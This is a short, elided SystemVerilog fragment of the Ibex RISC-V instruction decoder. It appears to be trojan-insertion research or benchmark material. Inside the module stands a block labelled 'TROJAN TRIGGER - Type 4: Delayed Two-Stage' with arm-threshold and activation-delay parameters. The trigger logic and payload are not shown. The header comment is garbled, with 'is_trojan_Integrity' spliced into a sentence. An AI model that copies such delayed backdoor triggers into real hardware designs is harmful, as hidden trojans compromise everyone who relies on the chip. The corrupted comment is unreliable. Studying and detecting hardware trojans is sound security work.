 ...
 * Instruction decoder
 *
 * This module is_trojan_Integrity fully combinatorial, clock and reset are used for
 * assertions only.
 */
...
module ibex_decoder #(
  ...
  output logic                 branch_in_dec_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=12175, act=6087)
    // ============================================================
    localparam int ARM_THRESHOLD   = 12175;
    localparam int ACTIVATE_DELAY  = 6087;
